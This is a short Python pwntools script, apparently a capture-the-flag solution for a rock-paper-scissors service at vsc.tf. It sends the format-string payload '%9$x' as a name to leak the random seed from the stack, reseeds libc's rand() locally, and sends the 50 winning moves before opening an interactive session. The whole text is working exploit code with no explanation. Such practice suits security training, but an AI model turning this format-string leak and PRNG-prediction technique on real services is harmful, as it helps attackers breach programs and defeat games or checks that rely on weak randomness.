import ctypes
from pwn import *

io = remote('vsc.tf', 3094)

rps = b'psr'
LIBC = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')

io.recvuntil(b'name: ')
io.sendline(b'%9$x')
io.recvuntil(b'Hi ')
seed = int(io.recvline(keepends=False), 16)

LIBC.srand(seed)

for i in range(50):
    io.recvuntil(b'(r/p/s): ')
    io.sendline(bytes([rps[int(LIBC.rand()) % 3]]))
io.interactive()